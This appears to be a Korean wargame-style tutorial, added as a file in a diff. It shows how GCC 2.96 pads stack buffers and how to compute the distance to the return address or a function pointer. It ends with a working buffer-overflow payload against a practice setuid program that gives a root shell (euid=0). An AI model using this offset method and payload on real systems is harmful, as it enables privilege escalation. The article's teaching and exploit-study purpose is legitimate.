@@ -1,0 +1,191 @@
+GCC 버젼 2.96에서 buf구조                                                                    -. hackerleon in Null@Root
+
+얼마전 제 홈페이지에서 프레임 포인터에 관한 사항중 gcc버전 2.96에서 문제점에 관한 연구글을 NaNu9님 올려주신적이 있었다^^감사!!..그 연구 결과를 토대로 기존의 취약프로그램에 적용시 어떠한 형태로 적용되며, gcc 2.96에서 메모리 구조는 어떠한가를 알아보고 BOF나 FSB에 적용할수 있는 방법을 알아보고자 한다.
+
+우선 http://hackerleon.cybersoldier.net 의 Q&A란의 470번 글을 참조하여 기본 전제로 한다.
+
+다음의 동일한 소스를 각각 gcc 2.91과 2.96에서 컴파일해 보도록 하자.
+
+//test1.c
+#include "dumpcode.h"
+#include <stdio.h>
+
+main()
+{ char buf2[12];
+char buf[20];
+fgets(buf,128,stdin);
+printf("buf1:%x , buf2:%x, %d\n",buf,buf2,buf2-buf);
+dumpcode((char*)buf,64);
+}
+
+test1을 통해 gcc 2.96과 gcc 2.91로 각각 컴파일된 프로그램의 메모리 구조를 보려고 한다.
+우선 gcc 2.91에서의 결과이다.
+
+$./test1 <--- gcc 2.91
+a
+a
+buf1:bffffa98 , buf2:bffffaac, 20
+0xbffffa98 61 0a 00 40 34 97 04 08 60 ae 00 40 04 fb ff bf a..@4...`..@....
+0xbffffaa8 b8 fa ff bf 4b 84 04 08 20 97 04 08 34 97 04 08 ....K... ...4...
+0xbffffab8 d8 fa ff bf cb 29 03 40 01 00 00 00 04 fb ff bf .....).@........
+0xbffffac8 0c fb ff bf 68 38 01 40 01 00 00 00 b0 83 04 08 ....h8.@........
+
+
+위의 결과는 우리가 아주 많이 봐왔구..당연한 결과 이다..도식적으로 보면
+
+[buf(20)][buf2(12)][ebp(4)][ret]
+
+아주 dump를 안해봐도 간단하게 유추가 가능 하다.
+
+그럼 이번에는 gcc 2.96에서의 결과이다.
+
+$./test1 <--- gcc 2.96
+a
+buf1:bfffefa0 , buf2:bfffefc0, 32
+0xbfffefa0 61 0a 00 40 a8 ca 13 40 44 f0 ff bf ce 6b 12 40 a..@...@D....k.@
+0xbfffefb0 e8 ef ff bf 20 d0 00 40 50 83 04 08 a8 ca 13 40 .... ..@P......@
+0xbfffefc0 44 f0 ff bf 44 63 01 40 e8 ef ff bf d1 84 04 08 D...Dc.@........
+0xbfffefd0 18 98 04 08 fc 98 04 08 18 f0 ff bf fc bb 03 40 ...............@
+
+이번의 결과는 아주 이상스럽다. buf에서 buf2까지의 거리가 32byte로 나왔구..
+메모리구조를 보아도 아주 이상스러운 배열을 하고 있다..도식적으로 보며
+
+[buf(20)][dummy1(12)][buf2(12)][dummy2(4)][dummy3(8)][ebp(4)][ret]
+
+메모리 사이사이 마다 dummy(-임의로 명함-)들이 들어가는 것을 볼수 있다..
+
+이렇듯 gcc 2.96에서는 메모리의 구조를 파확하기 어렵게 되어있는데...
+심심한 여름저녁 할일도 없고 해서 약간의 노가다를 해본결과 재미있는 규칙성을 알아내게 되었다.
+
+test1에 buf와 buf2의 크기를 변경해가며 buf에서 buf2까지의 거리를 계산해 보았다.
+
+
+- 표1 -
+http://hackerleon.cybersoldier.net/images/gcc296.jpg
+
+표1에서 보면.. (정말 할일 없었나보다^^)
+buf의 크기가 16의 배수로 나가고 첫16배수 이후부터 다음 16배수 까지는 buf2가 12byte이상일경우 다음16배수 값이 거리로 나오는것을 볼수 있다..
+즉...test1에서 보면..buf 가 20바이트이므로 16 < buf <= 32 범위에 있고 따라서 buf2와의 거리는 "32" 인것이다. 
+
+그럼 임의로 buf값을 정하고 buf2까지의 거리를 계산해보자..
+buf=200
+buf=12
+에서 16x12=192, 16x13=208 이므로 192 < buf <= 208 범위에 있다 따라서 위의 아이디어가 맞다면 거리는 208이 나와야 할것이다.
+
+음...이아이디어가 맞는지 buf의 크기를 변경하여 시행하여보자
+
+//test2.c 
+#include <stdio.h>
+
+main()
+{ char buf2[12];
+char buf[200];
+fgets(buf,224,stdin);
+printf("buf1:%x , buf2:%x, %d\n",buf,buf2,buf2-buf);
+}
+
+$./test2 <--- gcc 2.96
+a
+a
+buf1:bfffeef0 , buf2:bfffefc0, 208
+
+역시 아이디어가 맞았다...
+
+그럼 우린 gcc 2.96에서도 소스에서 변수입력제한이 없다면 취약프로그램의 메모리구조를 유추하여 공략을 할수 있겠다...^^
+
+담은 buf2에서 ret까지의 모양을 보도록 하자..
+
+test1에서의 결과 
+
+[buf(20)][dummy1(12)][buf2(12)][dummy2(4)][dummy3(8)][ebp(4)][ret]
+
+이렇게 생겨먹은 것을 보았다..앞서 buf에서 buf2사이의 dummy의 길이는 알아보았고...buf2에서 ret까지의 거리에 대해서도 알아보자...
+
+역시 마챤가지인듯 하다..^^
+
+test3를 보자
+
+//test3.c
+
+main()
+{ char buf[20];
+fgets(buf,64,stdin);
+dumpcode((char*)buf,64);
+}
+
+$./test3
+a
+0xbfffefb0 61 0a 00 bf 20 d0 00 40 50 83 04 08 a8 ca 13 40 a... ..@P......@
+0xbfffefc0 44 f0 ff bf 44 63 01 40 e8 ef ff bf d1 84 04 08 D...Dc.@........
+0xbfffefd0 d0 97 04 08 b4 98 04 08 18 f0 ff bf fc bb 03 40 ...............@
+0xbfffefe0 01 00 00 00 44 f0 ff bf 4c f0 ff bf 66 83 04 08 ....D...L...f...
+
+여기서 gdb로 ret를 알아본결과 ret값이 0x4003bbfc 로 나왔다 따라서 
+ret는 0xbfffefdc 이다.
+여기서도 앞서 계산한것과 같이 buf2의 크기가 16의 배수의 범위에서 최대값을 기준으로 dummy가 생성된다는것을 알수 있다..
+
+buf가 20 이므로 16 < buf <= 32 범위에 있고 따라서 buf에서 dummy3까지의 거리는 32인것이다.
+
+정리해보면 
+
+[buf(20) ----> 32(20+12)][dummy3(8)][ebp(4)][ret]
+
+으하하...ret까지의 거리도 계산하여 유추가 가능 하다...
+
+
+그럼 실전 BOF문제를 gcc 2.96에서 컴파일 해보고 우리가 생각한 것이 맞는가를 확인해보도록 하자.
+
+//test4.c
+#include <stdio.h>
+
+void printit() {
+printf("Hello there!\n");
+}
+
+main()
+{ int crap;
+void (*call)()=printit;
+char buf[20];
+fgets(buf,50,stdin);
+setreuid(0,0);
+call();
+}
+
+어서 많이 본든한 소스이다^^(mainsourece newbie13번 문제)
+
+gcc 2.96이하에서 라면 buf(20)뒤에 printit을 call하는 주소가 나오므로..egg를 띄우고 [20][egg] 를 입력하면 바로 shell을 획득 할수 있엇을 것이다...
+그럼 gcc 2.96으로 컴팔된 넘은 어떻게 할까...위에서 공부 한데로..
+
+우선 buf의 크기가 20 이므로 16 < buf <=32 범위이다 따라서 buf에서 dummy3까지의 거리는 32 이다..
+dummy3의 크기는 위에서 보았듯이 8byte 이므로 printit 을 call하는 주소까지의 거리는 32+8 = 40 바이트 인셈이다.
+
+따라서 공격 방법은 [40][egg]가 되겠다.. 맞나 살펴보도록 하자.
+
+egg:0xbffffa78
+
+$(printf "AAAA...(40)\x78\xfa\xff\xbf";cat)\./test4
+
+id
+uid=500(leon) gid=(500)leon euid=0(root)
+
+된다...
+
+gcc 2.96에서도 메모리의 상대적 위치를 유추 할수 있게 되었다...
+그러나 여기서..
+
+아주 중요한점 하나가 있다..
+즉, fgets의 입력한도를 작게 잡으면 오버를 할수 없다는 점이다.
+
+ 
+다음과 같이 정리할수 있다.
+
+1. 변수1과 변수2 간거리는 변수1의 크기가 포함된 16배수의 범위중  최대값 만큼 이다.
+
+2. 변수정의가 끝나는 곳은 dummy3(8byte)가 할당된다.
+
+3. 변수 입력범위를 변수1이 포함된 16배수 최대값 이하로 할경우 BOF는 일어나지 않는다.
+
+
+어수선 하게 gcc2.96에서의 취약 프로그램의 적용을 알아보았다..
+
+gcc 2.96에서 컴파일된 FSB의 ret값 계산이나..BOF ret찾기등에 유용할것 같구 좀더 많은 연구가 이루어 지면 좋겠다... 
